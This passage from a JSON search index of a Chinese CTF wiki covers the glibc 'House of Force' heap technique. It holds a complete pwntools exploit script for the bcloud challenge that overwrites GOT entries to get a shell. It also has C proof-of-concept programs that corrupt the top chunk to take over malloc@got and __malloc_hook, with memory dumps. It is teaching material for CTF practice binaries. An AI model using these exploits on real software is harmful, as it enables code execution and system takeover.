\u4fee\u6539\u524d\u4e09\u4e2a note \u7684\u5927\u5c0f\u4e3a16\uff0c\u5e76\u4fee\u6539\u5176\u6307\u9488\u4e3a free@got\uff0catoi@got\uff0catoi@got \u5c06 free@got \u4fee\u6539\u4e3a puts@plt\u3002 \u6cc4\u6f0f atoi \u5730\u5740\u3002 \u518d\u6b21\u4fee\u6539\u53e6\u5916\u4e00\u4e2a atoi got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u62ff\u5230shell\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./bcloud\" bcloud = ELF ( \"./bcloud\" ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./bcloud\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def offset_bin_main_arena ( idx ): word_bytes = context . word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offset def exp (): # leak heap base p . sendafter ( 'Input your name: \\n ' , 'a' * 64 ) p . recvuntil ( 'Hey ' + 'a' * 64 ) # sub name's chunk' s header heap_base = u32 ( p . recv ( 4 )) - 8 log . success ( 'heap_base: ' + hex ( heap_base )) p . sendafter ( 'Org: \\n ' , 'a' * 64 ) p . sendlineafter ( 'Host: \\n ' , p32 ( 0xffffffff )) # name,org,host, for each is (0x40+8) topchunk_addr = heap_base + ( 0x40 + 8 ) * 3 # make topchunk point to 0x0804B0A0-8 p . sendlineafter ( 'option--->>' , '1' ) notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 targetaddr = notesize_addr - 8 offset_target_top = targetaddr - topchunk_addr # 4 for size_t, 7 for malloc_allign malloc_size = offset_target_top - 4 - 7 # plus 4 because malloc(v2 + 4); p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( malloc_size - 4 )) # most likely malloc_size-4<0... if malloc_size - 4 > 0 : p . sendlineafter ( 'Input the content: \\n ' , '' ) #gdb.attach(p) # set notesize[0] = notesize[1] = notesize[2]=16 # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got p . sendlineafter ( 'option--->>' , '1' ) p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( 1000 )) payload = p32 ( 16 ) * 3 + ( notelist_addr - notesize_addr - 12 ) * 'a' + p32 ( bcloud . got [ 'free' ]) + p32 ( bcloud . got [ 'atoi' ]) * 2 p . sendlineafter ( 'Input the content: \\n ' , payload ) # overwrite free@got with puts@plt p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 0 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( bcloud . plt [ 'puts' ])) # leak atoi addr by fake free p . sendlineafter ( 'option--->>' , '4' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 1 )) atoi_addr = u32 ( p . recv ( 4 )) libc_base = atoi_addr - libc . symbols [ 'atoi' ] system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc base addr: ' + hex ( libc_base )) # overwrite atoi@got with system p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 2 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( system_addr )) # get shell p . sendlineafter ( 'option--->>' , '/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp () \u9898\u76ee \u00b6 2016 Boston Key Party CTF cookbook","title":"House Of Force"},{"location":"pwn/heap/house_of_force/#house-of-force","text":"","title":"House Of Force"},{"location":"pwn/heap/house_of_force/#_1","text":"House Of Force \u5c5e\u4e8e House Of XXX \u7cfb\u5217\u7684\u5229\u7528\u65b9\u6cd5\uff0cHouse Of XXX \u662f 2004 \u5e74\u300aThe Malloc Maleficarum-Glibc Malloc Exploitation Techniques\u300b\u4e2d\u63d0\u51fa\u7684\u4e00\u7cfb\u5217\u9488\u5bf9 glibc \u5806\u5206\u914d\u5668\u7684\u5229\u7528\u65b9\u6cd5\u3002 \u4f46\u662f\uff0c\u7531\u4e8e\u5e74\u4ee3\u4e45\u8fdc\u300aThe Malloc Maleficarum\u300b\u4e2d\u63d0\u51fa\u7684\u5927\u591a\u6570\u65b9\u6cd5\u4eca\u5929\u90fd\u4e0d\u80fd\u594f\u6548\uff0c\u6211\u4eec\u73b0\u5728\u6240\u6307\u7684 House Of XXX \u5229\u7528\u76f8\u6bd4 2004 \u5e74\u6587\u7ae0\u4e2d\u5199\u7684\u5df2\u6709\u8f83\u5927\u7684\u4e0d\u540c\u3002\u4f46\u662f\u300aThe Malloc Maleficarum\u300b\u4f9d\u7136\u662f\u4e00\u7bc7\u63a8\u8350\u9605\u8bfb\u7684\u6587\u7ae0\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bfb\u5230\u5b83\u7684\u539f\u6587\uff1a https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/house_of_force/#_2","text":"House Of Force \u662f\u4e00\u79cd\u5806\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u8bf4 House Of Force \u5fc5\u987b\u5f97\u57fa\u4e8e\u5806\u6f0f\u6d1e\u6765\u8fdb\u884c\u5229\u7528\u3002\u5982\u679c\u4e00\u4e2a\u5806(heap based) \u6f0f\u6d1e\u60f3\u8981\u901a\u8fc7 House Of Force \u65b9\u6cd5\u8fdb\u884c\u5229\u7528\uff0c\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6\uff1a \u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df \u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f House Of Force \u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e glibc \u5bf9 top chunk \u7684\u5904\u7406\uff0c\u6839\u636e\u524d\u9762\u5806\u6570\u636e\u7ed3\u6784\u90e8\u5206\u7684\u77e5\u8bc6\u6211\u4eec\u5f97\u77e5\uff0c\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u6240\u6709\u7a7a\u95f2\u7684\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece top chunk \u4e2d\u5206\u5272\u51fa\u76f8\u5e94\u7684\u5927\u5c0f\u4f5c\u4e3a\u5806\u5757\u7684\u7a7a\u95f4\u3002 \u90a3\u4e48\uff0c\u5f53\u4f7f\u7528 top chunk \u5206\u914d\u5806\u5757\u7684 size \u503c\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\u4efb\u610f\u503c\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u7b54\u6848\u662f\uff0c\u53ef\u4ee5\u4f7f\u5f97 top chunk\u6307\u5411\u6211\u4eec\u671f\u671b\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4e00\u6b21\u4efb\u610f\u5730\u5740\u5199\u3002\u7136\u800c\u5728 glibc \u4e2d\uff0c\u4f1a\u5bf9\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u548c top chunk \u73b0\u6709\u7684 size \u8fdb\u884c\u9a8c\u8bc1 // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av->top; size = chunksize(victim); // \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av->top = remainder; set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } \u7136\u800c\uff0c\u5982\u679c\u53ef\u4ee5\u7be1\u6539 size \u4e3a\u4e00\u4e2a\u5f88\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u901a\u8fc7\u8fd9\u4e2a\u9a8c\u8bc1\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u8bf4\u7684\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u63a7\u5236top chunk size \u57df\u7684\u6f0f\u6d1e\u3002 (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) \u4e00\u822c\u7684\u505a\u6cd5\u662f\u628a top chunk \u7684 size \u6539\u4e3a-1\uff0c\u56e0\u4e3a\u5728\u8fdb\u884c\u6bd4\u8f83\u65f6\u4f1a\u628a size \u8f6c\u6362\u6210\u65e0\u7b26\u53f7\u6570\uff0c\u56e0\u6b64 -1 \u4e5f\u5c31\u662f\u8bf4unsigned long \u4e2d\u6700\u5927\u7684\u6570\uff0c\u6240\u4ee5\u65e0\u8bba\u5982\u4f55\u90fd\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002 remainder = chunk_at_offset(victim, nb); av->top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u4e4b\u540e\u8fd9\u91cc\u4f1a\u628a top \u6307\u9488\u66f4\u65b0\uff0c\u63a5\u4e0b\u6765\u7684\u5806\u5757\u5c31\u4f1a\u5206\u914d\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7528\u6237\u53ea\u8981\u63a7\u5236\u4e86\u8fd9\u4e2a\u6307\u9488\u5c31\u76f8\u5f53\u4e8e\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c(write-anything-anywhere)\u3002 \u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctopchunk\u7684size\u4e5f\u4f1a\u66f4\u65b0\uff0c\u5176\u66f4\u65b0\u7684\u65b9\u6cd5\u5982\u4e0b victim = av -> top ; size = chunksize ( victim ); remainder_size = size - nb ; set_head ( remainder , remainder_size | PREV_INUSE ); \u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e0b\u6b21\u5728\u6307\u5b9a\u4f4d\u7f6e\u5206\u914d\u5927\u5c0f\u4e3a x \u7684 chunk\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd remainder_size \u4e0d\u5c0f\u4e8e x+ MINSIZE\u3002","title":"\u539f\u7406"},{"location":"pwn/heap/house_of_force/#1","text":"\u5728\u5b66\u4e60\u5b8c HOF \u7684\u539f\u7406\u4e4b\u540e\uff0c\u6211\u4eec\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u8bf4\u660e HOF \u7684\u5229\u7528\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u7684\u76ee\u6807\u662f\u901a\u8fc7HOF\u6765\u7be1\u6539 malloc@got.plt \u5b9e\u73b0\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b int main() { long *ptr,*ptr2; ptr=malloc(0x10); ptr=(long *)(((long)ptr)+24); *ptr=-1; // <=== \u8fd9\u91cc\u628atop chunk\u7684size\u57df\u6539\u4e3a0xffffffffffffffff malloc(-4120); // <=== \u51cf\u5c0ftop chunk\u6307\u9488 malloc(0x10); // <=== \u5206\u914d\u5757\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199 } \u9996\u5148\uff0c\u6211\u4eec\u5206\u914d\u4e00\u4e2a 0x10 \u5b57\u8282\u5927\u5c0f\u7684\u5757 0x602000: 0x0000000000000000 0x0000000000000021 <=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk 0x602030: 0x0000000000000000 0x0000000000000000 \u4e4b\u540e\u628a top chunk \u7684 size \u6539\u4e3a 0xffffffffffffffff\uff0c\u5728\u771f\u6b63\u7684\u9898\u76ee\u4e2d\uff0c\u8fd9\u4e00\u6b65\u53ef\u4ee5\u901a\u8fc7\u5806\u6ea2\u51fa\u7b49\u6f0f\u6d1e\u6765\u5b9e\u73b0\u3002 \u56e0\u4e3a -1 \u5728\u8865\u7801\u4e2d\u662f\u4ee5 0xffffffffffffffff \u8868\u793a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8d4b\u503c -1 \u5c31\u53ef\u4ee5\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0xffffffffffffffff <=== top chunk size\u57df\u88ab\u66f4\u6539 0x602030: 0x0000000000000000 0x0000000000000000 \u6ce8\u610f\u6b64\u65f6\u7684 top chunk \u4f4d\u7f6e\uff0c\u5f53\u6211\u4eec\u8fdb\u884c\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u66f4\u6539 top chunk \u7684\u4f4d\u7f6e\u5230\u6211\u4eec\u60f3\u8981\u7684\u5730\u65b9 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x0000000000602020 <=== top chunk\u6b64\u65f6\u4e00\u5207\u6b63\u5e38 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 \u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884c malloc(-4120); \uff0c-4120\u662f\u600e\u4e48\u5f97\u51fa\u7684\u5462\uff1f \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u660e\u786e\u8981\u5199\u5165\u7684\u76ee\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u6211\u7f16\u8bd1\u7a0b\u5e8f\u540e\uff0c0x601020 \u662f malloc@got.plt \u7684\u5730\u5740 0x601020: 0x00007ffff7a91130 <=== malloc@got.plt \u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c06 top chunk \u6307\u5411 0x601010 \u5904\uff0c\u8fd9\u6837\u5f53\u4e0b\u6b21\u518d\u5206\u914d chunk \u65f6\uff0c\u5c31\u53ef\u4ee5\u5206\u914d\u5230 malloc@got.plt \u5904\u7684\u5185\u5b58\u4e86\u3002 \u4e4b\u540e\u660e\u786e\u5f53\u524d top chunk \u7684\u5730\u5740\uff0c\u6839\u636e\u524d\u9762\u63cf\u8ff0\uff0ctop chunk \u4f4d\u4e8e 0x602020\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u5982\u4e0b 0x601010-0x602020=-4112 \u6b64\u5916\uff0c\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u7684\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\u3002 void * __libc_malloc ( size_t bytes ) { \u5982\u679c\u60f3\u8981\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u7ecf\u8fc7\u5185\u90e8\u7684 checked_request2size \u53ef\u4ee5\u5f97\u5230\u8fd9\u6837\u7684\u5927\u5c0f\uff0c\u5373 /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u4e00\u65b9\u9762\uff0c\u6211\u4eec\u9700\u8981\u7ed5\u8fc7 REQUEST_OUT_OF_RANGE(req) \u8fd9\u4e2a\u68c0\u6d4b\uff0c\u5373\u6211\u4eec\u4f20\u7ed9 malloc \u7684\u503c\u5728\u8d1f\u6570\u8303\u56f4\u5185\uff0c\u4e0d\u5f97\u5927\u4e8e -2 * MINSIZE\uff0c\u8fd9\u4e2a\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u53ef\u4ee5\u6ee1\u8db3\u7684\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5728\u6ee1\u8db3\u5bf9\u5e94\u7684\u7ea6\u675f\u540e\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 request2size \u6b63\u597d\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u5f97 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK \u6070\u597d\u4e3a-4112\u3002\u9996\u5148\uff0c\u5f88\u663e\u7136\uff0c-4112 \u662f chunk \u5bf9\u9f50\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u5c06\u5176\u5206\u522b\u51cf\u53bb SIZE_SZ\uff0cMALLOC_ALIGN_MASK \u5c31\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u9700\u8981\u7533\u8bf7\u7684\u503c\u3002\u5176\u5b9e\u6211\u4eec\u8fd9\u91cc\u53ea\u9700\u8981\u51cf SIZE_SZ \u5c31\u53ef\u4ee5\u4e86\uff0c\u56e0\u4e3a\u591a\u51cf\u7684 MALLOC_ALIGN_MASK \u6700\u540e\u8fd8\u4f1a\u88ab\u5bf9\u9f50\u6389\u3002\u800c \u5982\u679c -4112 \u4e0d\u662f MALLOC_ALIGN \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u591a\u51cf\u4e00\u4e9b\u4e86\u3002\u5f53\u7136\uff0c\u6211\u4eec\u6700\u597d\u4f7f\u5f97\u5206\u914d\u4e4b\u540e\u5f97\u5230\u7684 chunk \u4e5f\u662f\u5bf9\u9f50\u7684\uff0c\u56e0\u4e3a\u5728\u91ca\u653e\u4e00\u4e2a chunk \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u884c\u5bf9\u9f50\u68c0\u67e5\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u5f53\u8c03\u7528 malloc(-4120) \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u88ab\u62ac\u9ad8\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f4d\u7f6e 0x7ffff7dd1b20 <main_arena>:\\ 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x0000000000601010 <=== \u53ef\u4ee5\u89c2\u5bdf\u5230top chunk\u88ab\u62ac\u9ad8 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 \u4e4b\u540e\uff0c\u6211\u4eec\u5206\u914d\u7684\u5757\u5c31\u4f1a\u51fa\u73b0\u5728 0x601010+0x10 \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f 0x601020 \u53ef\u4ee5\u66f4\u6539 got \u8868\u4e2d\u7684\u5185\u5bb9\u4e86\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u88ab\u62ac\u9ad8\u7684\u540c\u65f6\uff0cmalloc@got \u9644\u8fd1\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u4fee\u6539\u3002 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 ));","title":"\u7b80\u5355\u793a\u4f8b1"},{"location":"pwn/heap/house_of_force/#2","text":"\u5728\u4e0a\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u6f14\u793a\u4e86\u901a\u8fc7 HOF \u4f7f\u5f97 top chunk \u7684\u6307\u9488\u51cf\u5c0f\u6765\u4fee\u6539\u4f4d\u4e8e\u5176\u4e0a\u9762(\u4f4e\u5730\u5740)\u7684got\u8868\u4e2d\u7684\u5185\u5bb9\uff0c \u4f46\u662f HOF \u5176\u5b9e\u4e5f\u53ef\u4ee5\u4f7f\u5f97 top chunk \u6307\u9488\u589e\u5927\u6765\u4fee\u6539\u4f4d\u4e8e\u9ad8\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u793a\u4f8b\u6765\u6f14\u793a\u8fd9\u4e00\u70b9 int main() { long *ptr,*ptr2; ptr=malloc(0x10); ptr=(long *)(((long)ptr)+24); *ptr=-1; <=== \u4fee\u6539top chunk size malloc(140737345551056); <=== \u589e\u5927top chunk\u6307\u9488 malloc(0x10); } \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u4ee3\u7801\u4e0e\u7b80\u5355\u793a\u4f8b1\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u7b2c\u4e8c\u6b21 malloc \u7684 size \u6709\u6240\u4e0d\u540c\u3002 \u8fd9\u6b21\u6211\u4eec\u7684\u76ee\u6807\u662f malloc_hook\uff0c\u6211\u4eec\u77e5\u9053 malloc_hook \u662f\u4f4d\u4e8e libc.so \u91cc\u7684\u5168\u5c40\u53d8\u91cf\u503c\uff0c\u9996\u5148\u67e5\u770b\u5185\u5b58\u5e03\u5c40 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \u53ef\u4ee5\u770b\u5230 heap \u7684\u57fa\u5740\u5728 0x602000\uff0c\u800c libc \u7684\u57fa\u5740\u5728 0x7ffff7a0d000\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u901a\u8fc7 HOF \u6269\u5927 top chunk\u6307\u9488\u7684\u503c\u6765\u5b9e\u73b0\u5bf9 malloc_hook \u7684\u5199\u3002 \u9996\u5148\uff0c\u7531\u8c03\u8bd5\u5f97\u77e5 __malloc_hook \u7684\u5730\u5740\u4f4d\u4e8e 0x7ffff7dd1b10 \uff0c\u91c7\u53d6\u8ba1\u7b97 0x7ffff7dd1b00-0x602020-0x10=140737345551056 \u7ecf\u8fc7\u8fd9\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230 top chunk \u7684\u5730\u5740\u88ab\u62ac\u9ad8\u5230\u4e86 0x00007ffff7dd1b00 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x00007ffff7dd1b00 <=== top chunk 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 \u4e4b\u540e\uff0c\u6211\u4eec\u53ea\u8981\u518d\u6b21\u5206\u914d\u5c31\u53ef\u4ee5\u63a7\u5236 0x7ffff7dd1b10 \u5904\u7684 __malloc_hook \u503c\u4e86 rax = 0x00007ffff7dd1b10 0x400562 <main+60> mov edi, 0x10 0x400567 <main+65> call 0x400410 <malloc@plt>","title":"\u7b80\u5355\u793a\u4f8b2"},{"location":"pwn/heap/house_of_force/#_3","text":"\u5728\u8fd9\u4e00\u8282\u4e2d\u8bb2\u89e3\u4e86 House Of Force \u7684\u539f\u7406\u5e76\u4e14\u7ed9\u51fa\u4e86\u4e24\u4e2a\u5229\u7528\u7684\u7b80\u5355\u793a\u4f8b\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e24\u4e2a\u7b80\u5355\u793a\u4f8b\u6211\u4eec\u4f1a\u53d1\u73b0\u5176\u5b9eHOF\u7684\u5229\u7528\u8981\u6c42\u8fd8\u662f\u76f8\u5f53\u82db\u523b\u7684\u3002 \u9996\u5148\uff0c\u9700\u8981\u5b58\u5728\u6f0f\u6d1e\u4f7f\u5f97\u7528\u6237\u80fd\u591f\u63a7\u5236 top chunk \u7684 size \u57df\u3002 \u5176\u6b21\uff0c \u9700\u8981\u7528\u6237\u80fd\u81ea\u7531\u63a7\u5236 malloc \u7684\u5206\u914d\u5927\u5c0f \u7b2c\u4e09\uff0c\u5206\u914d\u7684\u6b21\u6570\u4e0d\u80fd\u53d7\u9650\u5236 \u5176\u5b9e\u8fd9\u4e09\u70b9\u4e2d\u7b2c\u4e8c\u70b9\u5f80\u5f80\u662f\u6700\u96be\u529e\u7684\uff0cCTF \u9898\u76ee\u4e2d\u5f80\u5f80\u4f1a\u7ed9\u7528\u6237\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\u9650\u5236\u6700\u5c0f\u548c\u6700\u5927\u503c\u4f7f\u5f97\u4e0d\u80fd\u901a\u8fc7HOF \u7684\u65b9\u6cd5\u8fdb\u884c\u5229\u7528\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/heap/house_of_force/#hitcon-training-lab-11","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u4e3b\u8981\u4fee\u6539\u5176 magic \u51fd\u6570\u4e3a","title":"HITCON training lab 11"},{"location":"pwn/heap/house_of_force/#_4","text":"\u279c hitcontraning_lab11 git: ( master ) file bamboobox bamboobox: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped \u279c hitcontraning_lab11 git: ( master ) checksec bamboobox [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a 64 